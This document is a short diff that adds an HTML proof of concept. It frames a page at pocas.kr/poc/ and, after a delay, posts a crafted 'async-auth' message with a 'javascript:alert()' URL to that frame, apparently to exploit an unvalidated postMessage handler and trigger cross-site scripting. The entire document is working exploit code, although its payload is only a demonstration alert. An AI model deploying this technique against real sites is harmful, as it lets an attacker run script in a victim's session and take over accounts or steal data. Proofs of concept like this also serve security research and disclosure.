@@ -1,0 +1,9 @@
+<iframe src="https://pocas.kr/poc/" id="ex"></iframe>
+
+<script>
+    poc = document.getElementById('ex')
+    setTimeout(() => {
+        poc.contentWindow.postMessage('{"async-auth":"status=other&url=javascript:alert()"}', '*')
+    }, 1500)
+
+</script>
